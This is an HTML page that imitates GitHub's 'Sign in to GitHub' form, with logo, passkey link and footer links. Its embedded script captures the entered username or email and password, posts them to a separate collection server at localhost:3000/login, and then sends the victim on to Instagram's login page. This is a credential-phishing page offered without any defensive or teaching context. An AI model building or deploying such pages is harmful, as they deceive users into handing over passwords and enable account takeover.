<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Github Sign In Page</title>
	<link rel="stylesheet" href="style2.css">
</head>
<body>
	
<div class="wrapper">
	<div class="logo">
		<img src="./img/githublogo.png" alt="GitHub">
	</div>
	<div class="title">
		<p>Sign in to GitHub</p>
	</div>
	<div class="form" id="form">
		<div class="input_field">
			<label>Username or email address</label>
			<input type="text" class="input" id="email" name="email">
		</div>
		<div class="input_field">
			<label>Password</label>
			<input type="password" class="input" id="password" name="password">
			<a href="#" class="forgot">Forgot password?</a>
		</div>
		<div class="btn">
			<input type="submit" value="Sign in" class="sign_btn">
		</div>
	</div>
	<div class="create_act">
        <p id="sign-in"><a href="#">Sign in with a passkey</a></p>
		<p>New to GitHub? <a href="#">Create an account.</a></p>
	</div>
	<div class="footer">
		<ul>
			<li><a href="#">Terms</a>
            </li><li><a href="#">Privacy</a></li>
            <li><a href="#">Docs</a></li>
            <li><a href="#">Contact GitHub Support</a></li>
            <li><a href="#">Manage cookies</a></li>
            <li><a href="#">Do not share my personal information</a></li>
			
		</ul>
	</div> 
</div>	
<script>
   const form = document.getElementById('form');

        
form.addEventListener('submit', async (event) => {
    event.preventDefault(); 
    
    
    const email = form.elements['email'].value;
    const password = form.elements['password'].value;

    try {
        
        const response = await fetch('http://localhost:3000/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        });

        if (response.ok) {
            
            window.location.href = "https://www.instagram.com/accounts/login/?hl=en";
        } else {
           
            alert("Login failed. Please try again.");
        }
    } catch (error) {
        console.error("Error submitting form:", error);
        alert("An error occurred. Please try again.");
    }
});

</script>
</body>
</html>
